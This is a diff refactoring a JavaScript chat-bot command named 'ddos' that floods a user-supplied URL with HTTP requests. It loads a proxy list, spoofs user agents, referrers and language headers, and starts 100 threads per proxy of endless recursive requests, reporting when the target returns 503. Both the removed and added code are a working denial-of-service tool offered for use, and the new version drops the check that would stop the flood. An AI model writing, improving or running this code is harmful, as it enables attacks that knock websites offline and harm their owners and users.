@@ -1,9 +1,10 @@
 const axios = require("axios");
 const fs = require("fs");
-const SocksProxyAgent = require("socks-proxy-agent");
-const HttpsProxyAgent = require("https-proxy-agent");
+const { SocksProxyAgent } = require("socks-proxy-agent");
+const { HttpsProxyAgent } = require("https-proxy-agent");
+const { generateUserAgent } = require("../system/useragent.js");
 
-module.exports["config"] = {
+module.exports.config = {
     name: "ddos",
     type: "tools",
     role: 3,
@@ -16,25 +17,21 @@ module.exports["config"] = {
     usage: "[url]",
 };
 
-const { generateUserAgent } = require('../system/useragent.js');
-
-const langHeader = [
+const langHeaders = [
     "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
-    "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
+    "fr-CH,fr;q=0.9,en;q=0.8,de;q=0.7,*;q=0.5",
     "en-US,en;q=0.5",
-    "en-US,en;q=0.9",
     "de-CH;q=0.7",
-    "da, en -gb;q=0.8, en;q=0.7",
+    "da,en-gb;q=0.8,en;q=0.7",
     "cs;q=0.5",
-    "en-US,en;q=0.9",
     "en-GB,en;q=0.9",
     "en-CA,en;q=0.9",
     "en-AU,en;q=0.9",
     "en-NZ,en;q=0.9",
-    "en-ZA,en;q=0.9"
+    "en-ZA,en;q=0.9",
 ];
 
-const refers = [
+const referrers = [
     "http://anonymouse.org/cgi-bin/anon-www.cgi/",
     "http://coccoc.com/search#query=",
     "http://ddosvn.somee.com/f5.php?v=",
@@ -49,102 +46,89 @@ const refers = [
     "http://help.baidu.com/searchResult?keywords="
 ];
 
-const cplist = [
+const cipherSuites = [
     "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
     "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
-    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384 :ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256 :ECDHE -RSA-AES128-SHA:E CDHE-ECDSA-AES128-S HA :ECDHE -RSA-AES256 -SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
-    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM"
+    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES",
+    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
 ];
 
-const acceptHeader = [
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+const acceptHeaders = [
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
 ];
 
-const maxRequests = Number.MAX_SAFE_INTEGER; // Set the max number of requests
-const requestsPerSecond = Number.MAX_SAFE_INTEGER; // Requests per second
-const numThreads = 100; // Number of threads
+const proxyFilePath = "../proxy.txt";
+const maxRequests = Number.MAX_SAFE_INTEGER;
+const requestsPerSecond = Number.MAX_SAFE_INTEGER;
+const numThreads = 100;
 
-function randElement(arr) {
-    return arr[Math.floor(Math.random() * arr.length)];
-}
+const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
 
-module.exports["run"] = async ({ args, chat, font }) => {
+const loadProxies = () => {
+    try {
+        return fs.readFileSync(proxyFilePath, "utf-8").split("\n").map((line) => line.trim());
+    } catch {
+        return [];
+    }
+};
+
+// Main attack logic
+const performAttack = (url, agent, headers, onComplete) => {
+    axios
+        .get(url, { httpAgent: agent, headers, timeout: 0 })
+        .then(() => setTimeout(() => performAttack(url, agent, headers, onComplete), 0))
+        .catch((err) => {
+            if (err.response?.status === 503) {
+                console.log("Target under heavy load (503).");
+            } else if (err.response?.status === 502) {
+                console.log("Error: Bad Gateway (502).");
+            } else {
+                console.log("Request error: " + err.message);
+            }
+            setTimeout(() => performAttack(url, agent, headers, onComplete), 0);
+        });
+};
+
+module.exports.run = async ({ args, chat, font }) => {
     const targetUrl = args[0];
-    if (!targetUrl || (!targetUrl.startsWith("http://") && !targetUrl.startsWith("https://"))) {
+
+    if (!targetUrl || !/^https?:\/\//.test(targetUrl)) {
         return chat.reply(font.thin("Invalid URL. Please enter a valid URL starting with http:// or https://"));
     }
 
-    const proxyFile = "../proxy.txt";
+    const proxies = loadProxies();
+    if (!proxies.length) {
+        return chat.reply(font.thin("No proxies found. Please add proxies to the proxy file."));
+    }
 
     const headers = {
-        "Accept": acceptHeader[Math.floor(Math.random() * acceptHeader.length)],
-        "Accept-Language": langHeader[Math.floor(Math.random() * langHeader.length)],
-        "Cache-Control": randElement(cplist),
-        "Referer": randElement(refers),
+        "Accept": getRandomElement(acceptHeaders),
+        "Accept-Language": getRandomElement(langHeaders),
+        "Cache-Control": getRandomElement(cipherSuites),
+        "Referer": getRandomElement(referrers),
         "Connection": "keep-alive",
         "DNT": "1",
         "Upgrade-Insecure-Requests": "1",
         "TE": "Trailers",
     };
 
-    const proxies = (() => {
-        try {
-            return fs.readFileSync(proxyFile, "utf-8").split("\n").map((line) => line.trim());
-        } catch {
-            return [];
-        }
-    })();
-
     let continueAttack = true;
-    const start = await chat.reply(font.thin("Starting DDOS ATTACK..."));
+    await chat.reply(font.thin("Starting DDOS ATTACK..."));
 
-    const attack = (url, agent) => {
-        try {
-            if (!continueAttack) return;
-
-            headers["User-Agent"] = generateUserAgent();
-
-            axios
-                .get(url, { httpAgent: agent || null, headers, timeout: 0 })
-                .then((response) => {
-                    if (response.status === 503) {
-                        chat.log("DDOS STATUS 503 BOOM BAGSAK!")
-                    }
-                })
-                .catch((error) => {
-                    if (error.response && error.response.status === 502) {
-                        chat.log("DDOS STATUS 502");
-                    }
-                });
-
-            setTimeout(() => attack(url, agent), 1000 / requestsPerSecond);
-        } catch (error) {
-            console.log("Error: " + error.message);
-            setTimeout(() => attack(url, agent), 1000 / requestsPerSecond);
-        }
-    };
-
-    let requests = 0;
     for (let i = 0; i < numThreads; i++) {
-        for (let proxy of proxies) {
-            const proxyParts = proxy.split(":");
-            const agent =
-                proxyParts[0].startsWith("socks")
-                    ? new SocksProxyAgent(`socks5://${proxyParts[0]}:${proxyParts[1]}`)
-                    : new HttpsProxyAgent(`http://${proxyParts[0]}:${proxyParts[1]}`);
+        for (const proxy of proxies) {
+            const [host, port] = proxy.split(":");
+            const agent = host.startsWith("socks")
+                ? new SocksProxyAgent(`socks5://${host}:${port}`)
+                : new HttpsProxyAgent(`http://${host}:${port}`);
 
-            attack(targetUrl, agent);
+            performAttack(targetUrl, agent, headers, () => (continueAttack = false));
         }
     }
 
     setTimeout(() => {
         continueAttack = false;
-        chat.log('Max Flood requests reached.');
-        chat.reply(font.thin("Max Flood requests reached, attack stopped."));
+        chat.reply(font.thin("Max flood requests reached. Attack stopped."));
     }, (maxRequests / requestsPerSecond) * 1000);
-
 };
